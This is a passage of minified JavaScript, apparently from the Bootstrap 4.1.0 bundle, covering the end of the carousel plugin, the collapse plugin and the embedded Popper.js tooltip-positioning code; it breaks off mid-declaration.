function (i) { return this.each(function () { var t = k(this).data(P), e = c({}, M, k(this).data()); "object" == typeof i && (e = c({}, e, i)); var n = "string" == typeof i ? i : e.slide; if (t || (t = new o(this, e), k(this).data(P, t)), "number" == typeof i) t.to(i); else if ("string" == typeof n) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } else e.interval && (t.pause(), t.cycle()) }) }, o._dataApiClickHandler = function (t) { var e = gt.getSelectorFromElement(this); if (e) { var n = k(e)[0]; if (n && k(n).hasClass(V)) { var i = c({}, k(n).data(), k(this).data()), r = this.getAttribute("data-slide-to"); r && (i.interval = !1), o._jQueryInterface.call(k(n), i), r && k(n).data(P).to(r), t.preventDefault() } } }, s(o, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return M } }]), o }(), k(document).on(K.CLICK_DATA_API, J.DATA_SLIDE, Z._dataApiClickHandler), k(window).on(K.LOAD_DATA_API, function () { k(J.DATA_RIDE).each(function () { var t = k(this); Z._jQueryInterface.call(t, t.data()) }) }), k.fn[L] = Z._jQueryInterface, k.fn[L].Constructor = Z, k.fn[L].noConflict = function () { return k.fn[L] = R, Z._jQueryInterface }, Z), Et = (tt = "collapse", nt = "." + (et = "bs.collapse"), it = ($ = e).fn[tt], rt = { toggle: !0, parent: "" }, ot = { toggle: "boolean", parent: "(string|element)" }, st = { SHOW: "show" + nt, SHOWN: "shown" + nt, HIDE: "hide" + nt, HIDDEN: "hidden" + nt, CLICK_DATA_API: "click" + nt + ".data-api" }, at = "show", lt = "collapse", ct = "collapsing", ft = "collapsed", ht = "width", ut = "height", dt = { ACTIVES: ".show, .collapsing", DATA_TOGGLE: '[data-toggle="collapse"]' }, pt = function () { function a(t, e) { this._isTransitioning = !1, this._element = t, this._config = this._getConfig(e), this._triggerArray = $.makeArray($('[data-toggle="collapse"][href="#' + t.id + '"],[data-toggle="collapse"][data-target="#' + t.id + '"]')); for (var n = $(dt.DATA_TOGGLE), i = 0; i < n.length; i++) { var r = n[i], o = gt.getSelectorFromElement(r); null !== o && 0 < $(o).filter(t).length && (this._selector = o, this._triggerArray.push(r)) } this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle() } var t = a.prototype; return t.toggle = function () { $(this._element).hasClass(at) ? this.hide() : this.show() }, t.show = function () { var t, e, n = this; if (!this._isTransitioning && !$(this._element).hasClass(at) && (this._parent && 0 === (t = $.makeArray($(this._parent).find(dt.ACTIVES).filter('[data-parent="' + this._config.parent + '"]'))).length && (t = null), !(t && (e = $(t).not(this._selector).data(et)) && e._isTransitioning))) { var i = $.Event(st.SHOW); if ($(this._element).trigger(i), !i.isDefaultPrevented()) { t && (a._jQueryInterface.call($(t).not(this._selector), "hide"), e || $(t).data(et, null)); var r = this._getDimension(); $(this._element).removeClass(lt).addClass(ct), (this._element.style[r] = 0) < this._triggerArray.length && $(this._triggerArray).removeClass(ft).attr("aria-expanded", !0), this.setTransitioning(!0); var o = "scroll" + (r[0].toUpperCase() + r.slice(1)), s = gt.getTransitionDurationFromElement(this._element); $(this._element).one(gt.TRANSITION_END, function () { $(n._element).removeClass(ct).addClass(lt).addClass(at), n._element.style[r] = "", n.setTransitioning(!1), $(n._element).trigger(st.SHOWN) }).emulateTransitionEnd(s), this._element.style[r] = this._element[o] + "px" } } }, t.hide = function () { var t = this; if (!this._isTransitioning && $(this._element).hasClass(at)) { var e = $.Event(st.HIDE); if ($(this._element).trigger(e), !e.isDefaultPrevented()) { var n = this._getDimension(); if (this._element.style[n] = this._element.getBoundingClientRect()[n] + "px", gt.reflow(this._element), $(this._element).addClass(ct).removeClass(lt).removeClass(at), 0 < this._triggerArray.length) for (var i = 0; i < this._triggerArray.length; i++) { var r = this._triggerArray[i], o = gt.getSelectorFromElement(r); if (null !== o) $(o).hasClass(at) || $(r).addClass(ft).attr("aria-expanded", !1) } this.setTransitioning(!0); this._element.style[n] = ""; var s = gt.getTransitionDurationFromElement(this._element); $(this._element).one(gt.TRANSITION_END, function () { t.setTransitioning(!1), $(t._element).removeClass(ct).addClass(lt).trigger(st.HIDDEN) }).emulateTransitionEnd(s) } } }, t.setTransitioning = function (t) { this._isTransitioning = t }, t.dispose = function () { $.removeData(this._element, et), this._config = null, this._parent = null, this._element = null, this._triggerArray = null, this._isTransitioning = null }, t._getConfig = function (t) { return (t = c({}, rt, t)).toggle = Boolean(t.toggle), gt.typeCheckConfig(tt, t, ot), t }, t._getDimension = function () { return $(this._element).hasClass(ht) ? ht : ut }, t._getParent = function () { var n = this, t = null; gt.isElement(this._config.parent) ? (t = this._config.parent, "undefined" != typeof this._config.parent.jquery && (t = this._config.parent[0])) : t = $(this._config.parent)[0]; var e = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]'; return $(t).find(e).each(function (t, e) { n._addAriaAndCollapsedClass(a._getTargetFromElement(e), [e]) }), t }, t._addAriaAndCollapsedClass = function (t, e) { if (t) { var n = $(t).hasClass(at); 0 < e.length && $(e).toggleClass(ft, !n).attr("aria-expanded", n) } }, a._getTargetFromElement = function (t) { var e = gt.getSelectorFromElement(t); return e ? $(e)[0] : null }, a._jQueryInterface = function (i) { return this.each(function () { var t = $(this), e = t.data(et), n = c({}, rt, t.data(), "object" == typeof i && i); if (!e && n.toggle && /show|hide/.test(i) && (n.toggle = !1), e || (e = new a(this, n), t.data(et, e)), "string" == typeof i) { if ("undefined" == typeof e[i]) throw new TypeError('No method named "' + i + '"'); e[i]() } }) }, s(a, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return rt } }]), a }(), $(document).on(st.CLICK_DATA_API, dt.DATA_TOGGLE, function (t) { "A" === t.currentTarget.tagName && t.preventDefault(); var n = $(this), e = gt.getSelectorFromElement(this); $(e).each(function () { var t = $(this), e = t.data(et) ? "toggle" : n.data(); pt._jQueryInterface.call(t, e) }) }), $.fn[tt] = pt._jQueryInterface, $.fn[tt].Constructor = pt, $.fn[tt].noConflict = function () { return $.fn[tt] = it, pt._jQueryInterface }, pt), yt = "undefined" != typeof window && "undefined" != typeof document, bt = ["Edge", "Trident", "Firefox"], Tt = 0, Ct = 0; Ct < bt.length; Ct += 1)if (yt && 0 <= navigator.userAgent.indexOf(bt[Ct])) { Tt = 1; break } var wt = yt && window.Promise ? function (t) { var e = !1; return function () { e || (e = !0, window.Promise.resolve().then(function () { e = !1, t() })) } } : function (t) { var e = !1; return function () { e || (e = !0, setTimeout(function () { e = !1, t() }, Tt)) } }; function It(t) { return t && "[object Function]" === {}.toString.call(t) } function Dt(t, e) { if (1 !== t.nodeType) return []; var n = getComputedStyle(t, null); return e ? n[e] : n } function At(t) { return "HTML" === t.nodeName ? t : t.parentNode || t.host } function St(t) { if (!t) return document.body; switch (t.nodeName) { case "HTML": case "BODY": return t.ownerDocument.body; case "#document": return t.body }var e = Dt(t), n = e.overflow, i = e.overflowX, r = e.overflowY; return /(auto|scroll|overlay)/.test(n + r + i) ? t : St(At(t)) } var Ot = {}, Nt = function () { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : "all"; if (t = t.toString(), Ot.hasOwnProperty(t)) return Ot[t]; switch (t) { case "11": Ot[t] = -1 !== navigator.userAgent.indexOf("Trident"); break; case "10": Ot[t] = -1 !== navigator.appVersion.indexOf("MSIE 10"); break; case "all": Ot[t] = -1 !== navigator.userAgent.indexOf("Trident") || -1 !== navigator.userAgent.indexOf("MSIE") }return Ot.all = Ot.all || Object.keys(Ot).some(function (t) { return Ot[t] }), Ot[t] }; function kt(t) { if (!t) return document.documentElement; for (var e = Nt(10) ? document.body : null, n = t.offsetParent; n === e && t.nextElementSibling;)n = (t = t.nextElementSibling).offsetParent; var i = n && n.nodeName; return i && "BODY" !== i && "HTML" !== i ? -1 !== ["TD", "TABLE"].indexOf(n.nodeName) && "static" === Dt(n, "position") ? kt(n) : n : t ? t.ownerDocument.documentElement : document.documentElement } function Lt(t) { return null !== t.parentNode ? Lt(t.parentNode) : t } function Pt(t, e) { if (!(t && t.nodeType && e && e.nodeType)) return document.documentElement; var n = t.compareDocumentPosition(e) & Node.DOCUMENT_POSITION_FOLLOWING, i = n ? t : e, r = n ? e : t, o = document.createRange(); o.setStart(i, 0), o.setEnd(r, 0); var s, a, l = o.commonAncestorContainer; if (t !== l && e !== l || i.contains(r)) return "BODY" === (a = (s = l).nodeName) || "HTML" !== a && kt(s.firstElementChild) !== s ? kt(l) : l; var c = Lt(t); return c.host ? Pt(c.host, e) : Pt(t, Lt(e).host) } function xt(t) { var e = "top" === (1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "top") ? "scrollTop" : "scrollLeft", n = t.nodeName; if ("BODY" === n || "HTML" === n) { var i = t.ownerDocument.documentElement; return (t.ownerDocument.scrollingElement || i)[e] } return t[e] } function jt(t, e) { var n = "x" === e ? "Left" : "Top", i = "Left" === n ? "Right" : "Bottom"; return parseFloat(t["border" + n + "Width"], 10) + parseFloat(t["border" + i + "Width"], 10) } function Rt(t, e, n, i) { return Math.max(e["offset" + t], e["scroll" + t], n["client" + t], n["offset" + t], n["scroll" + t], Nt(10) ? n["offset" + t] + i["margin" + ("Height" === t ? "Top" : "Left")] + i["margin" + ("Height" === t ? "Bottom" : "Right")] : 0) } function Mt() { var t = document.body, e = document.documentElement, n = Nt(10) && getComputedStyle(e); return { height: Rt("Height", t, e, n), width: Rt("Width", t, e, n) } } var Ht = function (t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }, Wt = function () { function i(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } return function (t, e, n) { return e && i(t.prototype, e), n && i(t, n), t } }(), Ft = function (t, e, n) { return e in t ? Object.defineProperty(t, e, { value: n, enumerable: !0, configurable: !0, writable: !0 }) : t[e] = n, t }, Ut = Object.assign || function (t) { for (var e = 1; e < arguments.length; e++) { var n = arguments[e]; for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]) } return t }; function Bt(t) { return Ut({}, t, { right: t.left + t.width, bottom: t.top + t.height }) } function Kt(t) { var e = {}; try { if (Nt(10)) { e = t.getBoundingClientRect(); var n = xt(t, "top"), i = xt(t, "left"); e.top += n, e.left += i, e.bottom += n, e.right += i } else e = t.getBoundingClientRect() } catch (t) { } var r = { left: e.left, top: e.top, width: e.right - e.left, height: e.bottom - e.top }, o = "HTML" === t.nodeName ? Mt() : {}, s = o.width || t.clientWidth || r.right - r.left, a = o.height || t.clientHeight || r.bottom - r.top, l = t.offsetWidth - s, c = t.offsetHeight - a; if (l || c) { var f = Dt(t); l -= jt(f, "x"), c -= jt(f, "y"), r.width -= l, r.height -= c } return Bt(r) } function Vt(t, e) { var n = 2 < arguments.length && void 0 !== arguments[2] && arguments[2], i = Nt(10), r = "HTML" === e.nodeName, o = Kt(t), s = Kt(e), a = St(t), l = Dt(e), c = parseFloat(l.borderTopWidth, 10), f = parseFloat(l.borderLeftWidth, 10); n && "HTML" === e.nodeName && (s.top = Math.max(s.top, 0), s.left = Math.max(s.left, 0)); var h = Bt({ top: o.top - s.top - c, left: o.left - s.left - f, width: o.width, height: o.height }); if (h.marginTop = 0, h.marginLeft = 0, !i && r) { var u = parseFloat(l.marginTop, 10), d = parseFloat(l.marginLeft, 10); h.top -= c - u, h.bottom -= c - u, h.left -= f - d, h.right -= f - d, h.marginTop = u, h.marginLeft = d } return (i && !n ? e.contains(a) : e === a && "BODY" !== a.nodeName) && (h = function (t, e) { var n = 2 < arguments.length && void 0 !== arguments[2] && arguments[2], i = xt(e, "top"), r = xt(e, "left"), o = n ? -1 : 1; return t.top += i * o, t.bottom += i * o, t.left += r * o, t.right += r * o, t }(h, e)), h } function Qt(t) { if (!t || !t.parentElement || Nt()) return document.documentElement; for (var e = t.parentElement; e && "none" === Dt(e, "transform");)e = e.parentElement; return e || document.documentElement } function Yt(t, e, n, i) { var r = 4 < arguments.length && void 0 !== arguments[4] && arguments[4], o = { top: 0, left: 0 }, s = r ? Qt(t) : Pt(t, e); if ("viewport" === i) o = function (t) { var e = 1 < arguments.length && void 0 !== arguments[1] && arguments[1], n = t.ownerDocument.documentElement, i = Vt(t, n), r = Math.max(n.clientWidth, window.innerWidth || 0), o = Math.max(n.clientHeight, window.innerHeight || 0), s = e ? 0 : xt(n), a = e ? 0 : xt(n, "left"); return Bt({ top: s - i.top + i.marginTop, left: a - i.left + i.marginLeft, width: r, height: o }) }(s, r); else { var a = void 0; "scrollParent" === i ? "BODY" === (a = St(At(e))).nodeName && (a = t.ownerDocument.documentElement) : a = "window" === i ? t.ownerDocument.documentElement : i; var l = Vt(a, s, r); if ("HTML" !== a.nodeName || function t(e) { var n = e.nodeName; return "BODY" !== n && "HTML" !== n && ("fixed" === Dt(e, "position") || t(At(e))) }(s)) o = l; else { var c = Mt(), f = c.height, h = c.width; o.top += l.top - l.marginTop, o.bottom = f + l.top, o.left += l.left - l.marginLeft, o.right = h + l.left } } return o.left += n, o.top += n, o.right -= n, o.bottom -= n, o } function Gt(t, e, i, n, r) { var o = 5 < arguments.length && void 0 !== arguments[5] ? arguments[5] : 0; if (-1 === t.indexOf("auto")) return t; var s = Yt(i, n, o, r), a = { top: { width: s.width, height: e.top - s.top }, right: { width: s.right - e.right, height: s.height }, bottom: { width: s.width, height: s.bottom - e.bottom }, left: { width: e.left - s.left, height: s.height } }, l = Object.keys(a).map(function (t) { return Ut({ key: t }, a[t], { area: (e = a[t], e.width * e.height) }); var e }).sort(function (t, e) { return e.area - t.area }), c = l.filter(function (t) { var e = t.width, n = t.height; return e >= i.clientWidth && n >= i.clientHeight }), f = 0 < c.length ? c[0].key : l[0].key, h = t.split("-")[1]; return f + (h ? "-" + h : "") } function qt(t, e, n) { var i = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : null; return Vt(n, i ? Qt(e) : Pt(e, n), i) } function zt(t) { var e = getComputedStyle(t), n = parseFloat(e.marginTop) + parseFloat(e.marginBottom), i = parseFloat(e.marginLeft) + parseFloat(e.marginRight); return { width: t.offsetWidth + i, height: t.offsetHeight + n } } function Xt(t) { var e = { left: "right", right: "left", bottom: "top", top: "bottom" }; return t.replace(/left|right|bottom|top/g, function (t) { return e[t] }) } function Jt(t, e, n) { n = n.split("-")[0]; var i = zt(t), r = { width: i.width, height: i.height }, o = -1 !== ["right", "left"].indexOf(n), s = o ? "top" : "left", a = o ? "left" : "top", l = o ? "height" : "width", c = o ? "width" : "height"; return r[s] = e[s] + e[l] / 2 - i[l] / 2, r[a] = n === a ? e[a] - i[c] : e[Xt(a)], r } function Zt(t, e) { return Array.prototype.find ? t.find(e) : t.filter(e)[0] } function $t(t, n, e) { return (void 0 === e ? t : t.slice(0, function (t, e, n) { if (Array.prototype.findIndex) return t.findIndex(function (t) { return t[e] === n }); var i = Zt(t, function (t) { return t[e] === n }); return t.indexOf(i) }(t, "name", e))).forEach(function (t) { t.function && console.warn("`modifier.function` is deprecated, use `modifier.fn`!"); var e = t.function || t.fn; t.enabled && It(e) && (n.offsets.popper = Bt(n.offsets.popper), n.offsets.reference = Bt(n.offsets.reference), n = e(n, t)) }), n } function te(t, n) { return t.some(function (t) { var e = t.name; return t.enabled && e === n }) } function ee(t) { for (var e = [!1, "ms", "Webkit", "Moz", "O"], n = t.charAt(0).toUpperCase() + t.slice(1), i = 0; i < e.length; i++) { var r = e[i], o = r ? "" + r + n : t; if ("undefined" != typeof document.body.style[o]) return o } return null } function ne(t) { var e = t.ownerDocument; return e ? e.defaultView : window } function ie(t, e, n, i) { n.updateBound = i, ne(t).addEventListener("resize", n.updateBound, { passive: !0 }); var r = St(t); return function t(e, n, i, r) { var o = "BODY" === e.nodeName, s = o ? e.ownerDocument.defaultView : e; s.addEventListener(n, i, { passive: !0 }), o || t(St(s.parentNode), n, i, r), r.push(s) }(r, "scroll", n.updateBound, n.scrollParents), n.scrollElement = r, n.eventsEnabled = !0, n } function re() { var t, e; this.state.eventsEnabled && (cancelAnimationFrame(this.scheduleUpdate), this.state = (t = this.reference, e = this.state, ne(t).removeEventListener("resize", e.updateBound), e.scrollParents.forEach(function (t) { t.removeEventListener("scroll", e.updateBound) }), e.updateBound = null, e.scrollParents = [], e.scrollElement = null, e.eventsEnabled = !1, e)) } function oe(t) { return "" !== t && !isNaN(parseFloat(t)) && isFinite(t) } function se(n, i) { Object.keys(i).forEach(function (t) { var e = ""; -1 !== ["width", "height", "top", "right", "bottom", "left"].indexOf(t) && oe(i[t]) && (e = "px"), n.style[t] = i[t] + e }) } function ae(t, e, n) { var i = Zt(t, function (t) { return t.name === e }), r = !!i && t.some(function (t) { return t.name === n && t.enabled && t.order < i.order }); if (!r) { var o = "`" + e + "`", s = "`" + n + "`"; console.warn(s + " modifier is required by " + o + " modifier in order to work, be sure to include it before " + o + "!") } return r } var le = ["auto-start", "auto", "auto-end", "top-start", "top", "top-end", "right-start", "right", "right-end", "bottom-end", "bottom", "bottom-start", "left-end", "left", "left-start"], ce = le.slice(3); function fe(t) { var e = 1 < arguments.length && void 0 !== arguments[1] && arguments[1], n = ce.indexOf(t), i = ce.slice(n + 1).concat(ce.slice(0, n)); return e ? i.reverse() : i } var he = { FLIP: "flip", CLOCKWISE: "clockwise", COUNTERCLOCKWISE: "counterclockwise" }; function ue(t, r, o, e) { var s = [0, 0], a = -1 !== ["right", "left"].indexOf(e), n = t.split(/(\+|\-)/).map(function (t) { return t.trim() }), i = n.indexOf(Zt(n, function (t) { return -1 !== t.search(/,|\s/) })); n[i] && -1 === n[i].indexOf(",") && console.warn("Offsets separated by white space(s) are deprecated, use a comma (,) instead."); var l = /\s*,\s*|\s+/, c = -1 !== i ? [n.slice(0, i).concat([n[i].split(l)[0]]), [n[i].split(l)[1]].concat(n.slice(i + 1))] : [n]; return (c = c.map(function (t, e) { var n = (1 === e ? !a : a) ? "height" : "width", i = !1; return t.reduce(function (t, e) { return "" === t[t.length - 1] && -1 !== ["+", "-"].indexOf(e) ? (t[t.length - 1] = e, i = !0, t) : i ? (t[t.length - 1] += e, i = !1, t) : t.concat(e) }, []).map(function (t) { return function (t, e, n, i) { var r = t.match(/((?:\-|\+)?\d*\.?\d*)(.*)/), o = +r[1], s = r[2]; if (!o) return t; if (0 === s.indexOf("%")) { var a = void 0; switch (s) { case "%p": a = n; break; case "%": case "%r": default: a = i }return Bt(a)[e] / 100 * o } if ("vh" === s || "vw" === s) return ("vh" === s ? Math.max(document.documentElement.clientHeight, window.innerHeight || 0) : Math.max(document.documentElement.clientWidth, window.innerWidth || 0)) / 100 * o; return o }(t, n, r, o) }) })).forEach(function (n, i) { n.forEach(function (t, e) { oe(t) && (s[i] += t * ("-" === n[e - 1] ? -1 : 1)) }) }), s } var de = { placement: "bottom", positionFixed: !1, eventsEnabled: !0, removeOnDestroy: !1, onCreate: function () { }, onUpdate: function () { }, modifiers: { shift: { order: 100, enabled: !0, fn: function (t) { var e = t.placement, n = e.split("-")[0], i = e.split("-")[1]; if (i) { var r = t.offsets, o = r.reference, s = r.popper, a = -1 !== ["bottom", "top"].indexOf(n), l = a ? "left" : "top", c = a ? "width" : "height", f = { start: Ft({}, l, o[l]), end: Ft({}, l, o[l] + o[c] - s[c]) }; t.offsets.popper = Ut({}, s, f[i]) } return t } }, offset: { order: 200, enabled: !0, fn: function (t, e) { var n = e.offset, i = t.placement, r = t.offsets, o = r.popper, s = r.reference, a = i.split("-")[0], l = void 0; return l = oe(+n) ? [+n, 0] : ue(n, o, s, a), "left" === a ? (o.top += l[0], o.left -= l[1]) : "right" === a ? (o.top += l[0], o.left += l[1]) : "top" === a ? (o.left += l[0], o.top -= l[1]) : "bottom" === a && (o.left += l[0], o.top += l[1]), t.popper = o, t }, offset: 0 }, preventOverflow: { order: 300, enabled: !0, fn: function (t, i) { var e = i.boundariesElement || kt(t.instance.popper); t.instance.reference === e && (e = kt(e)); var r = Yt(t.instance.popper, t.instance.reference, i.padding, e, t.positionFixed); i.boundaries = r; var n = i.priority, o = t.offsets.popper, s = { primary: function (t) { var e = o[t]; return o[t] < r[t] && !i.escapeWithReference && (e = Math.max(o[t], r[t])), Ft({}, t, e) }, secondary: function (t) { var e = "right" === t ? "left" : "top", n = o[e]; return o[t] > r[t] && !i.escapeWithReference && (n = Math.min(o[e], r[t] - ("right" === t ? o.width : o.height))), Ft({}, e, n) } }; return n.forEach(function (t) { var e = -1 !== ["left", "top"].indexOf(t) ? "primary" : "secondary"; o = Ut({}, o, s[e](t)) }), t.offsets.popper = o, t }, priority: ["left", "right", "top", "bottom"], padding: 5, boundariesElement: "scrollParent" }, keepTogether: { order: 400, enabled: !0, fn: function (t) { var e = t.offsets, n = e.popper, i = e.reference, r = t.placement.split("-")[0], o = Math.floor, s = -1 !== ["top", "bottom"].indexOf(r), a = s ? "right" : "bottom", l = s ? "left" : "top", c = s ? "width" : "height"; return n[a] < o(i[l]) && (t.offsets.popper[l] = o(i[l]) - n[c]), n[l] > o(i[a]) && (t.offsets.popper[l] = o(i[a])), t } }, arrow: { order: 500, enabled: !0, fn: function (t, e) { var n; if (!ae(t.instance.modifiers, "arrow", "keepTogether")) return t; var i = e.element; if ("string" == typeof i) { if (!(i = t.instance.popper.querySelector(i))) return t } else if (!t.instance.popper.contains(i)) return console.warn("WARNING: `arrow.element` must be child of its popper element!"), t; var r = t.placement.split("-")[0], o = t.offsets, s = o.popper, a = o.reference, l = -1 !== ["left", "right"].indexOf(r), c = l ? "height" : "width", f = l ? "Top" : "Left", h = f.toLowerCase(), u = l ? "left" : "top", d = l ? "bottom" : "right", p = zt(i)[c]; a[d] - p < s[h] && (t.offsets.popper[h] -= s[h] - (a[d] - p)), a[h] + p > s[d] && (t.offsets.popper[h] += a[h] + p - s[d]), t.offsets.popper = Bt(t.offsets.popper); var g = a[h] + a[c] / 2 - p / 2, m = Dt(t.instance.popper), _ = parseFloat(m["margin" + f], 10), v = parseFloat(m["border" + f + "Width"], 10), E = g - t.offsets.popper[h] - _ - v; return E = Math.max(Math.min(s[c] - p, E), 0), t.arrowElement = i, t.offsets.arrow = (Ft(n = {}, h, Math.round(E)), Ft(n, u, ""), n), t }, element: "[x-arrow]" }, flip: { order: 600, enabled: !0, fn: function (p, g) { if (te(p.instance.modifiers, "inner")) return p; if (p.flipped && p.placement === p.originalPlacement) return p; var m = Yt(p.instance.popper, p.instance.reference, g.padding, g.boundariesElement, p.positionFixed), _ = p.placement.split("-")[0], v = Xt(_), E = p.placement.split("-")[1] || "", y = []; switch (g.behavior) { case he.FLIP: y = [_, v]; break; case he.CLOCKWISE: y = fe(_); break; case he.COUNTERCLOCKWISE: y = fe(_, !0); break; default: y = g.behavior }return y.forEach(function (t, e) { if (_ !== t || y.length === e + 1) return p; _ = p.placement.split("-")[0], v = Xt(_); var n, i = p.offsets.popper, r = p.offsets.reference, o = Math.floor, s = "left" === _ && o(i.right) > o(r.left) || "right" === _ && o(i.left) < o(r.right) || "top" === _ && o(i.bottom) > o(r.top) || "bottom" === _ && o(i.top) < o(r.bottom), a = o(i.left) < o(m.left), l = o(i.right) > o(m.right), c = o(i.top) < o(m.top), f = o(i.bottom) > o(m.bottom), h = "left" === _ && a || "right" === _ && l || "top" === _ && c || "bottom" === _ && f, u = -1 !== ["top", "bottom"].indexOf(_), d = !!g.flipVariations && (u && "start" === E && a || u && "end" === E && l || !u && "start" === E && c || !u && "end" === E && f); (s || h || d) && (p.flipped = !0, (s || h) && (_ = y[e + 1]), d && (E = "end" === (n = E) ? "start" : "start" === n ? "end" : n), p.placement = _ + (E ? "-" + E : ""), p.offsets.popper = Ut({}, p.offsets.popper, Jt(p.instance.popper, p.offsets.reference, p.placement)), p = $t(p.instance.modifiers, p, "flip")) }), p }, behavior: "flip", padding: 5, boundariesElement: "viewport" }, inner: { order: 700, enabled: !1, fn: function (t) { var e = t.placement, n = e.split("-")[0], i = t.offsets, r = i.popper, o = i.reference, s = -1 !== ["left", "right"].indexOf(n), a = -1 === ["top", "left"].indexOf(n); return r[s ? "left" : "top"] = o[n] - (a ? r[s ? "width" : "height"] : 0), t.placement = Xt(e), t.offsets.popper = Bt(r), t } }, hide: { order: 800, enabled: !0, fn: function (t) { if (!ae(t.instance.modifiers, "hide", "preventOverflow")) return t; var e = t.offsets.reference, n = Zt(t.instance.modifiers, function (t) { return "preventOverflow" === t.name }).boundaries; if (e.bottom < n.top || e.left > n.right || e.top > n.bottom || e.right < n.left) { if (!0 === t.hide) return t; t.hide = !0, t.attributes["x-out-of-boundaries"] = "" } else { if (!1 === t.hide) return t; t.hide = !1, t.attributes["x-out-of-boundaries"] = !1 } return t } }, computeStyle: { order: 850, enabled: !0, fn: function (t, e) { var n = e.x, i = e.y, r = t.offsets.popper, o = Zt(t.instance.modifiers, function (t) { return "applyStyle" === t.name }).gpuAcceleration; void 0 !== o && console.warn("WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!"); var s = void 0 !== o ? o : e.gpuAcceleration, a = Kt(kt(t.instance.popper)), l = { position: r.position }, c = { left: Math.floor(r.left), top: Math.floor(r.top), bottom: Math.floor(r.bottom), right: Math.floor(r.right) }, f = "bottom" === n ? "top" : "bottom", h = "right" === i ? "left" : "right", u = ee("transform"), d = void 0, p = void 0; if (p = "bottom" === f ? -a.height + c.bottom : c.top, d = "right" === h ? -a.width + c.right : c.left, s && u) l[u] = "translate3d(" + d + "px, " + p + "px, 0)", l[f] = 0, l[h] = 0, l.willChange = "transform"; else { var g = "bottom" === f ? -1 : 1, m = "right" === h ? -1 : 1; l[f] = p * g, l[h] = d * m, l.willChange = f + ", " + h } var _ = { "x-placement": t.placement }; return t.attributes = Ut({}, _, t.attributes), t.styles = Ut({}, l, t.styles), t.arrowStyles = Ut({}, t.offsets.arrow, t.arrowStyles), t }, gpuAcceleration: !0, x: "bottom", y: "right" }, applyStyle: { order: 900, enabled: !0, fn: function (t) { var e, n; return se(t.instance.popper, t.styles), e = t.instance.popper, n = t.attributes, Object.keys(n).forEach(function (t) { !1 !== n[t] ? e.setAttribute(t, n[t]) : e.removeAttribute(t) }), t.arrowElement && Object.keys(t.arrowStyles).length && se(t.arrowElement, t.arrowStyles), t }, onLoad: function (t, e, n, i, r) { var o = qt(r, e, t, n.positionFixed), s = Gt(n.placement, o, e, t, n.modifiers.flip.boundariesElement, n.modifiers.flip.padding); return e.setAttribute("x-placement", s), se(e, { position: n.positionFixed ? "fixed" : "absolute" }), n }, gpuAcceleration: void 0 } } }, pe = function () { function o(t, e) { var n = this, i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {}; Ht(this, o), this.scheduleUpdate = function () { return requestAnimationFrame(n.update) }, this.update = wt(this.update.bind(this)), this.options = Ut({}, o.Defaults, i), this.state = { isDestroyed: !1, isCreated: !1, scrollParents: [] }, this.reference = t && t.jquery ? t[0] : t, this.popper = e && e.jquery ? e[0] : e, this.options.modifiers = {}, Object.keys(Ut({}, o.Defaults.modifiers, i.modifiers)).forEach(function (t) { n.options.modifiers[t] = Ut({}, o.Defaults.modifiers[t] || {}, i.modifiers ? i.modifiers[t] : {}) }), this.modifiers = Object.keys(this.options.modifiers).map(function (t) { return Ut({ name: t }, n.options.modifiers[t]) }).sort(function (t, e) { return t.order - e.order }), this.modifiers.forEach(function (t) { t.enabled && It(t.onLoad) && t.onLoad(n.reference, n.popper, n.options, t, n.state) }), this.update(); var r = this.options.eventsEnabled; r && this.enableEventListeners(), this.state.eventsEnabled = r } return Wt(o, [{ key: "update", value: function () { return function () { if (!this.state.isDestroyed) { var t = { instance: this, styles: {}, arrowStyles: {}, attributes: {}, flipped: !1, offsets: {} }; t.offsets.reference = qt(this.state, this.popper, this.reference, this.options.positionFixed), t.placement = Gt(this.options.placement, t.offsets.reference, this.popper, this.reference, this.options.modifiers.flip.boundariesElement, this.options.modifiers.flip.padding), t.originalPlacement = t.placement, t.positionFixed = this.options.positionFixed, t.offsets.popper = Jt(this.popper, t.offsets.reference, t.placement), t.offsets.popper.position = this.options.positionFixed ? "fixed" : "absolute", t = $t(this.modifiers, t), this.state.isCreated ? this.options.onUpdate(t) : (this.state.isCreated = !0, this.options.onCreate(t)) } }.call(this) } }, { key: "destroy", value: function () { return function () { return this.state.isDestroyed = !0, te(this.modifiers, "applyStyle") && (this.popper.removeAttribute("x-placement"), this.popper.style.position = "", this.popper.style.top = "", this.popper.style.left = "", this.popper.style.right = "", this.popper.style.bottom = "", this.popper.style.willChange = "", this.popper.style[ee("transform")] = ""), this.disableEventListeners(), this.options.removeOnDestroy && this.popper.parentNode.removeChild(this.popper), this }.call(this) } }, { key: "enableEventListeners", value: function () { return function () { this.state.eventsEnabled || (this.state = ie(this.reference, this.options, this.state, this.scheduleUpdate)) }.call(this) } }, { key: "disableEventListeners", value: function () { return re.call(this) } }]), o }(); pe.Utils = ("undefined" != typeof window ? window : global).PopperUtils, pe.placements = le, pe.Defaults = de; var ge, me, _e, ve, Ee, ye, be, Te, Ce, we, Ie, De, Ae, Se, Oe, Ne, ke, Le, Pe, xe, je, Re, Me, He, We, Fe, Ue, Be, Ke, Ve, Qe, Ye, Ge, qe, ze, Xe, Je, Ze, $e, tn, en, nn, rn, on, sn, an, ln, cn, fn, hn, un, dn, pn, gn, mn, _n, vn, En, yn, bn, Tn, Cn, wn, In, Dn, An, Sn, On, Nn, kn, Ln, Pn, xn, jn, Rn, Mn, Hn, Wn, Fn, Un, Bn, Kn, Vn, Qn, Yn, Gn, qn, zn, Xn, Jn, Zn, $n, ti, ei, ni, ii, ri, oi, si, ai, li, ci, fi, hi, ui, di, pi, 